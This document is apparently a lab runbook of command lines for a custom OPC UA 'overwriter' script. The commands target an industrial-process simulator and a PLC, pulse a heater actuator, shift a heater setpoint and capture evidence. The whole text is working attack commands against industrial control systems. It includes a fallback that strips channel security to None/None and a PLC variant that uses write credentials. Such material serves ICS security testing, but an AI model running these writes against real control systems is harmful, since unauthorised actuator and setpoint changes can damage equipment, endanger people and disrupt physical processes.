1) Simulator (industrial-process) — pulse a boolean actuator (secure if possible)
node /scripts/opcua-overwriter/opcua-overwriter.mjs \
  --endpoint opc.tcp://industrial-process:4840/freeopcua/server/ \
  --forcePolicy Basic256Sha256 --forceMode SignAndEncrypt \
  --node 'ns=2;s=Heater.Actuators.heater_on' \
  --pulseMs 1500 --restore \
  --evidence /captures/opcua_phase3.jsonl \
  --pcap /captures/opcua_phase3.pcap


If the server rejects secure channel, fall back to None/None:

node /scripts/opcua-overwriter/opcua-overwriter.mjs \
  --endpoint opc.tcp://industrial-process:4840/freeopcua/server/ \
  --allowInsecure --forcePolicy None --forceMode None \
  --node 'ns=2;s=Heater.Actuators.heater_on' \
  --pulseMs 1500 --restore \
  --evidence /captures/opcua_phase3.jsonl \
  --pcap /captures/opcua_phase3.pcap

2) Simulator — nudge a numeric setpoint and restore
node /scripts/opcua-overwriter/opcua-overwriter.mjs \
  --endpoint opc.tcp://industrial-process:4840/freeopcua/server/ \
  --forcePolicy Basic256Sha256 --forceMode SignAndEncrypt \
  --node 'ns=2;s=Heater.Setpoints.heater_setpoint' \
  --nudgeAbs 0.5 --hold 5 --restore \
  --evidence /captures/opcua_phase3.jsonl \
  --pcap /captures/opcua_phase3.pcap

3) PLC — if you have a username/password with write rights
node /scripts/opcua-overwriter/opcua-overwriter.mjs \
  --endpoint opc.tcp://plc:4840 \
  --user <writer_user> --pass <writer_pass> \
  --node 'ns=1;s=heater_on' \
  --pulseMs 1500 --restore \
  --evidence /captures/opcua_phase3.jsonl \
  --pcap /captures/opcua_phase3.pcap


Evidence lands in /captures/opcua_phase3.jsonl 
(connect plan, inspect, writes, restore, pcap start/stop) 
and the server leaf cert is saved under /captures/certs/. 
Adjust --node to the exact ID you want to demo.
